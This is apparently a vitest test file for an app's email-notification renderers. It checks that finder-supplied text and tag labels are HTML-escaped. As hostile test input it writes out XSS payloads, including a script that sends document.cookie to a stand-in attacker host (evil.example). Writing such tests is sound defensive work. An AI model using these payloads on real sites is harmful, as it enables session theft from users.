import { describe, it, expect } from "vitest";
import { escapeHtml, renderRelayMessage, renderScan, renderPasswordReset } from "../notify/render";

describe("escapeHtml", () => {
  it("neutralises every character that can break out of markup", () => {
    expect(escapeHtml(`<script>`)).toBe("&lt;script&gt;");
    expect(escapeHtml(`a & b`)).toBe("a &amp; b");
    expect(escapeHtml(`"quoted"`)).toBe("&quot;quoted&quot;");
    expect(escapeHtml(`it's`)).toBe("it&#39;s");
  });

  it("escapes the ampersand first so entities are not double-broken", () => {
    expect(escapeHtml("&lt;")).toBe("&amp;lt;");
  });

  it("passes ordinary text through untouched", () => {
    expect(escapeHtml("Found your bag at gate 3")).toBe("Found your bag at gate 3");
  });
});

describe("renderRelayMessage — the finder's words are attacker-controlled", () => {
  const hostile = {
    tagLabel: "Red helmet",
    finderContact: `<img src=x onerror=alert(1)>`,
    message: `</p><script>fetch('//evil.example/'+document.cookie)</script>`,
    dashboardUrl: "https://example.com/dashboard/messages",
  };

  it("never emits the finder's raw markup into the HTML body", () => {
    const { html } = renderRelayMessage(hostile);
    // The property that matters is that no tag from the input survives as a
    // tag. Escaped text may still read "onerror=" inside it, which is inert
    // precisely because its angle brackets were escaped.
    expect(html).not.toContain("<script");
    expect(html).not.toContain("</script");
    expect(html).not.toContain("<img");

    // Nothing outside our own markup opens a tag: strip the elements this
    // renderer emits and no "<" should be left.
    const withoutOwnTags = html.replace(/<\/?(?:div|h1|p|strong|blockquote|a|br)\b[^>]*>/g, "");
    expect(withoutOwnTags).not.toContain("<");
  });

  it("still shows the message, escaped", () => {
    const { html } = renderRelayMessage(hostile);
    expect(html).toContain("&lt;/p&gt;&lt;script&gt;");
  });

  it("keeps the plain-text body readable and unescaped", () => {
    const { text } = renderRelayMessage(hostile);
    expect(text).toContain("</p><script>");
  });

  it("escapes a hostile tag label too", () => {
    const { html } = renderRelayMessage({ ...hostile, tagLabel: `<b>bold</b>` });
    expect(html).not.toContain("<b>bold</b>");
  });

  it("names the tag in the subject so a multi-tag owner can tell them apart", () => {
    const { subject } = renderRelayMessage({ ...hostile, tagLabel: "Blue suitcase" });
    expect(subject).toContain("Blue suitcase");
  });

  it("does not leak the finder's contact into the subject line", () => {
    // Subjects show up in notification previews on a lock screen.
    const { subject } = renderRelayMessage({ ...hostile, finderContact: "01700000000" });
    expect(subject).not.toContain("01700000000");
  });
});

describe("renderScan", () => {
  const base = {
    tagLabel: "Red helmet",
    scannedAt: new Date("2026-09-06T10:30:00Z"),
    approxLocation: "Dhaka, Bangladesh",
    dashboardUrl: "https://example.com/dashboard",
  };

  it("names the tag and the place", () => {
    const { subject, text } = renderScan(base);
    expect(subject).toContain("Red helmet");
    expect(text).toContain("Dhaka, Bangladesh");
  });

  it("copes with an unknown location", () => {
    const { text } = renderScan({ ...base, approxLocation: null });
    expect(text).toContain("Unknown location");
  });

  it("escapes a hostile label", () => {
    const { html } = renderScan({ ...base, tagLabel: "<script>x</script>" });
    expect(html).not.toContain("<script>x</script>");
  });
});

describe("renderPasswordReset", () => {
  it("includes the reset link", () => {
    const { html, text } = renderPasswordReset({ resetUrl: "https://example.com/r/abc" });
    expect(text).toContain("https://example.com/r/abc");
    expect(html).toContain("https://example.com/r/abc");
  });

  it("says how long the link lasts", () => {
    expect(renderPasswordReset({ resetUrl: "https://x.example" }).text).toMatch(/hour/i);
  });
});
